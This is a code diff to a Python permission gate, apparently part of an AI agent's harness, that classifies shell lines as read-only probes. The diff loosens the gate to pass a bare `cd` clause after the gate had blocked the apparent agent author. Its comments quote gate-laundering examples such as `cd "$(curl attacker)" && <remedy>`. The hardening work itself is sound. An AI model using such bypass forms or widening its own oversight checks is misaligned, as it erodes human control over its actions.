@@ -1153,6 +1153,14 @@ def _is_readonly_divineos_verb(cmd: str) -> bool:
 # the pattern -- the same distinction the whole day has been about.
 _SHELL_OPTION_ONLY = re.compile(r"set(?:\s+(?:[+-][A-Za-z]+|[a-z][a-z_]*))+\s*")
 
+# A clause that is a `cd` and a path and nothing else. SHAPE only -- the
+# dangerous characters are refused separately by membership against
+# _UNSAFE_IN_DISCARDED_PREFIX, which is already hardened and already the tuple
+# every other cd decision in this file is made against. Two checks rather than
+# one clever pattern, because the clever pattern is what let `cd "$(curl
+# attacker)"` through once before.
+_CD_ONLY_CLAUSE = re.compile(r"\s*cd\s+(?:\"[^\"]*\"|'[^']*'|\S+)\s*")
+
 
 def _split_shell_clauses(cmd: str) -> list[str]:
     """Split on real clause joiners, ignoring ones inside quotes.
@@ -1255,6 +1263,46 @@ def _is_readonly_probe(cmd: str) -> bool:
         # no operands beyond flags, and no assignment or redirection. Anything
         # that could name a file or a variable is not this.
         if _SHELL_OPTION_ONLY.fullmatch(clause):
+            return True
+        # AND A BARE `cd` IS THE SAME KIND OF NOTHING (2026-09-13).
+        #
+        # The argument three comments up was written for `set -o` and then asked
+        # of nothing else, which is the failure its own docstring describes one
+        # paragraph earlier: "the first repair opened one door and never swept
+        # the class." It happened again here, and the door it missed locked me
+        # out of this gate's evidence for several minutes while I mis-diagnosed
+        # the gate as a trapped key. Measured before believing:
+        #
+        #     divineos prereg overdue                   -> probe
+        #     set -o pipefail; divineos prereg overdue  -> probe
+        #     cd "<repo>"; divineos prereg overdue      -> BLOCKED
+        #
+        # A standalone `cd` clause has its prefix stripped, leaves the empty
+        # string, and empty reads as not-a-probe. But a cd changes this shell's
+        # working directory and touches no file, no store and no remote -- the
+        # identical inertness argument, and the cd is the habit half this house
+        # types on every single Bash call.
+        #
+        # THE PROPERTY, stated so the next gap is visible before it bites: a
+        # line is a probe when every clause either LOOKS and changes nothing, or
+        # DOES NOTHING AT ALL. Two clause kinds; the second had one member and
+        # needed two.
+        #
+        # NARROW ON PURPOSE, because loosening a cd check is how a gate gets
+        # laundered and this house has the worked examples: `cd "$(curl
+        # attacker)" && <remedy>`, `cd /a && cd /b && divineos correction`, and
+        # `cd /tmp>out && ...`. The shared parser accepted the last two; the
+        # letter recording that says narrowness was restored AT THE GATE and
+        # must stay here. So membership is asked of the existing hardened tuple
+        # rather than a fourth cd matcher being invented -- substitution,
+        # redirection, joiners and parens are refused whether quoted or not.
+        #
+        # NOT generalised to inert-commands-as-a-category. `export`, `umask`,
+        # `alias` and `trap` all look inert and are not. Two named inert things,
+        # each argued on its own, is the honest size of this.
+        if _CD_ONLY_CLAUSE.fullmatch(clause) and not any(
+            ch in clause for ch in _UNSAFE_IN_DISCARDED_PREFIX
+        ):
             return True
         return clause.startswith(_READONLY_PROBE_PREFIXES) or _is_readonly_divineos_verb(clause)
 
